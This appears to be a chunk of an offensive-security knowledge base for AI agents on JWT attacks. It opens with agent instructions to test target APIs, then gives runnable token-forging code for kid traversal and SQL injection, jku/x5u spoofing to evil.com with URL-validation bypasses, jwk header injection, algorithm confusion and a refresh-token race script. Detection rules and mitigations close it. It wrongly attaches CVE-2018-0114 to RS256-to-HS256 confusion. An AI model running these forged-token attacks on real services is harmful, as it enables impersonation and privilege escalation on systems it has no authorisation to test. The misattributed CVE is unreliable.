# JWT Key Injection & Token Attacks — Agent Chunk 74b
> Source: PortSwigger JWT Research, RFC 7515 (JWS), RFC 7517 (JWK), CVE-2018-0114, NEBULA Paper 2026
> Purpose: Understand advanced JWT header injection attacks (kid, jku, x5u, jwk), algorithm confusion beyond basic none/HS256, and refresh token rotation bypass techniques
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
When testing JWT-based APIs, decode the token header and check for kid, jku, x5u, and jwk parameters. Test kid for directory traversal and SQL injection. Test jku/x5u by pointing to attacker-controlled key servers. Test algorithm confusion by signing with the server's RSA public key using HS256. For refresh tokens, test race conditions in token rotation and check if revoked tokens in a chain still work.

---

## 1. JWT kid (Key ID) Injection

### 1.1 Directory Traversal via kid

The `kid` (Key ID) header parameter identifies which key to use for signature verification. If the server uses `kid` to construct a file path without sanitization, directory traversal is possible.

**Vulnerable server code:**
```python
def verify_jwt(token):
    header = jwt.get_unverified_header(token)
    kid = header['kid']
    # VULNERABLE: kid used directly in file path
    key_path = f"/keys/{kid}.pem"
    with open(key_path) as f:
        public_key = f.read()
    return jwt.decode(token, public_key, algorithms=['HS256'])
```

**Attack — sign with known file content:**
```python
import jwt

# /dev/null is empty → empty string as HMAC key
token = jwt.encode(
    {"sub": "admin", "role": "superuser"},
    key="",                          # Empty string = content of /dev/null
    algorithm="HS256",
    headers={"kid": "../../../dev/null"}
)

# Alternative: use /proc/sys/kernel/hostname (predictable content)
import requests
hostname = "web-server-01"  # Guessed or enumerated
token = jwt.encode(
    {"sub": "admin"},
    key=hostname,
    algorithm="HS256",
    headers={"kid": "../../../proc/sys/kernel/hostname"}
)
```

### 1.2 SQL Injection via kid

If `kid` is used in a database query to look up the key:

**Vulnerable code:**
```python
def get_key_by_kid(kid):
    # VULNERABLE: kid interpolated into SQL
    cursor.execute(f"SELECT key_value FROM keys WHERE kid = '{kid}'")
    return cursor.fetchone()['key_value']
```

**Attack payload:**
```python
# kid that returns a known value via UNION injection
kid_payload = "' UNION SELECT 'attacker-controlled-secret' -- "

token = jwt.encode(
    {"sub": "admin", "role": "superuser"},
    key="attacker-controlled-secret",
    algorithm="HS256",
    headers={"kid": kid_payload}
)
# Server queries: SELECT key_value FROM keys WHERE kid = '' UNION SELECT 'attacker-controlled-secret' --'
# Returns 'attacker-controlled-secret' as the key
# Token signature verifies against attacker's key
```

## 2. jku (JWK Set URL) Spoofing

### 2.1 How jku Works

The `jku` header parameter contains a URL pointing to a JWK Set (JSON Web Key Set) that the server fetches to obtain the verification key.

**Normal flow:**
```
JWT Header: { "alg": "RS256", "jku": "https://auth.target.com/.well-known/jwks.json", "kid": "key1" }
Server → fetches https://auth.target.com/.well-known/jwks.json → gets public key → verifies signature
```

### 2.2 Attack: Point jku to Attacker Server

```bash
# 1. Generate attacker's RSA key pair
openssl genrsa -out attacker.pem 2048
openssl rsa -in attacker.pem -pubout -out attacker_pub.pem

# 2. Create JWK Set on attacker's server (https://evil.com/jwks.json)
python3 -c "
from jwcrypto import jwk
import json

with open('attacker.pem') as f:
    key = jwk.JWK.from_pem(f.read().encode())

jwks = {'keys': [json.loads(key.export())]}
jwks['keys'][0]['kid'] = 'key1'
print(json.dumps(jwks, indent=2))
" > jwks.json
# Host jwks.json at https://evil.com/jwks.json

# 3. Sign token with attacker's private key, pointing jku to attacker's server
python3 -c "
import jwt

with open('attacker.pem') as f:
    private_key = f.read()

token = jwt.encode(
    {'sub': 'admin', 'role': 'superuser'},
    private_key,
    algorithm='RS256',
    headers={
        'jku': 'https://evil.com/jwks.json',
        'kid': 'key1'
    }
)
print(token)
"
```

**Bypass URL validation:**
```python
# If server validates jku domain, try bypasses:
headers = {"jku": "https://auth.target.com@evil.com/jwks.json"}           # URL confusion
headers = {"jku": "https://auth.target.com.evil.com/jwks.json"}           # Subdomain
headers = {"jku": "https://evil.com/auth.target.com/jwks.json"}           # Path confusion
headers = {"jku": "https://auth.target.com/redirect?url=https://evil.com/jwks.json"}  # Open redirect
```

## 3. x5u (X.509 URL) Abuse

### 3.1 Attack

Similar to jku, `x5u` points to an X.509 certificate chain URL. The server fetches the certificate and uses its public key for verification.

```python
# 1. Generate self-signed certificate
# openssl req -x509 -newkey rsa:2048 -keyout attacker.key -out attacker.crt -days 365 -nodes

import jwt

with open('attacker.key') as f:
    private_key = f.read()

token = jwt.encode(
    {"sub": "admin"},
    private_key,
    algorithm="RS256",
    headers={
        "x5u": "https://evil.com/attacker.crt"
    }
)
```

## 4. jwk Header Injection

### 4.1 Embedding the Key in the Token

The `jwk` header parameter allows the token itself to contain the public key used for verification. If the server trusts this embedded key, anyone can sign any token.

```python
from jwcrypto import jwk, jwt as jose_jwt
import json

# Generate new key pair
key = jwk.JWK.generate(kty='RSA', size=2048)

# Create token with embedded jwk
token = jose_jwt.JWT(
    header={
        "alg": "RS256",
        "jwk": json.loads(key.export_public())  # Public key embedded in header
    },
    claims={"sub": "admin", "role": "superuser"}
)
token.make_signed_token(key)
print(token.serialize())

# Server reads jwk from header → uses embedded public key → signature verifies
# Attacker controls the key → attacker controls the identity
```

## 5. Algorithm Confusion Beyond none/HS256

### 5.1 RS256-to-HS256 with Public Key (CVE-2018-0114)

**CVE-2018-0114 (node-jose):** The server expects RS256 (asymmetric) but the attacker sends HS256 (symmetric) signed with the server's RSA public key.

```python
import jwt
import requests

# 1. Obtain server's RSA public key (usually from JWKS endpoint or certificate)
jwks = requests.get("https://auth.target.com/.well-known/jwks.json").json()
public_key_pem = jwk_to_pem(jwks['keys'][0])  # Convert JWK to PEM format

# 2. Sign with HS256 using the public key as HMAC secret
token = jwt.encode(
    {"sub": "admin", "role": "superuser"},
    key=public_key_pem,          # RSA public key used as HMAC secret
    algorithm="HS256"            # Symmetric algorithm
)

# 3. Server logic (vulnerable):
# - Reads alg: "HS256" from header
# - Retrieves "the key" for this application — which is the RSA public key
# - Verifies HMAC with RSA public key → MATCHES (attacker used same key)
```

**Why it works:** The server stores one key per application. For RS256, that key is the public key (used for verification). For HS256, that same key is used as the HMAC secret. The attacker exploits this ambiguity.

### 5.2 ES256 Key Recovery from Nonce Reuse

If the server's ECDSA implementation reuses nonces (k-values), the private key can be recovered from two signatures:

```python
# Given two signatures (r1, s1) and (r2, s2) with same nonce k:
# k = (hash1 - hash2) * (s1 - s2)^(-1) mod n
# private_key = (s1 * k - hash1) * r1^(-1) mod n
```

## 6. Refresh Token Rotation Bypass via Race Conditions

### 6.1 The Attack

OAuth refresh token rotation issues a new refresh token and invalidates the old one on each use. A race condition occurs when multiple requests use the same refresh token simultaneously.

```python
import asyncio
import aiohttp

async def race_refresh(session, refresh_token):
    async with session.post(
        "https://auth.target.com/oauth2/token",
        data={
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "client_id": "app"
        }
    ) as resp:
        return await resp.json()

async def exploit():
    async with aiohttp.ClientSession() as session:
        # Send 20 concurrent refresh requests with the same token
        tasks = [race_refresh(session, "REFRESH_TOKEN_ABC") for _ in range(20)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Count successful token exchanges
        new_tokens = [r for r in results if isinstance(r, dict) and 'access_token' in r]
        print(f"Got {len(new_tokens)} access tokens from 1 refresh token")
        # If > 1, rotation is bypassable via race condition

asyncio.run(exploit())
```

### 6.2 Impact

- **Token multiplication:** One refresh token yields multiple valid access tokens.
- **Rotation bypass:** The "old" refresh token continues working alongside the "new" one.
- **Revocation evasion:** If the legitimate user's session revokes their refresh token, the attacker's parallel-obtained tokens remain valid.

## 7. NEBULA Paper 2026 — Lineage-Wide Revocation

### 7.1 The Problem

Traditional refresh token rotation revokes only the specific token presented. If an attacker obtains a refresh token and uses it before the legitimate user, the attacker gets a valid new token. When the legitimate user's old token is rejected (already rotated), the server detects compromise — but the attacker's new token is already in the wild.

### 7.2 NEBULA's Solution: Token Lineage Tracking

The NEBULA paper (2026) proposed tracking the entire lineage (chain) of refresh tokens. When compromise is detected (an already-rotated token is presented), the server revokes not just that token but every token descended from the common ancestor.

```
Token Lineage:
RT-1 → RT-2 → RT-3 (legitimate user)
         ↘ RT-2a → RT-2b (attacker, from intercepted RT-2)

When RT-2 is presented again (already rotated to RT-3):
  - Detect: RT-2 was already used
  - Revoke entire lineage: RT-1, RT-2, RT-3, RT-2a, RT-2b
  - All parties must re-authenticate
```

### 7.3 Implementation Consideration

```sql
-- Token lineage table
CREATE TABLE refresh_tokens (
    token_id UUID PRIMARY KEY,
    token_hash VARCHAR(64) NOT NULL,
    parent_token_id UUID REFERENCES refresh_tokens(token_id),
    lineage_root_id UUID NOT NULL,
    user_id UUID NOT NULL,
    is_revoked BOOLEAN DEFAULT FALSE,
    created_at TIMESTAMP DEFAULT NOW()
);

-- Revoke entire lineage
UPDATE refresh_tokens
SET is_revoked = TRUE
WHERE lineage_root_id = (
    SELECT lineage_root_id FROM refresh_tokens WHERE token_id = :compromised_token_id
);
```

## 8. Detection

```yaml
# Detect kid traversal attempts
- rule: JWT kid Directory Traversal
  condition: jwt.header.kid matches "\.\." or jwt.header.kid contains "/"
  severity: CRITICAL

# Detect external jku
- rule: JWT jku External URL
  condition: jwt.header.jku not starts_with "https://auth.ourcompany.com"
  severity: HIGH

# Detect algorithm confusion
- rule: JWT Algorithm Switch
  condition: jwt.header.alg != expected_algorithm
  severity: CRITICAL

# Detect refresh token race
- rule: Refresh Token Concurrent Use
  condition: refresh_token.use_count > 1 within 5 seconds
  severity: HIGH
```

## 9. Mitigation

1. **Sanitize kid:** Reject kid values containing `..`, `/`, `\`, or SQL metacharacters. Use allowlisted key IDs.
2. **Ignore jku/x5u/jwk:** Never fetch keys from URLs in JWT headers. Use a pre-configured JWKS endpoint only.
3. **Pin algorithms:** Explicitly specify allowed algorithms in verification; reject tokens with unexpected alg values.
4. **Atomic refresh rotation:** Use database-level locks or transactions to prevent race conditions in token rotation.
5. **Implement lineage tracking:** Adopt NEBULA-style lineage-wide revocation for refresh token chains.
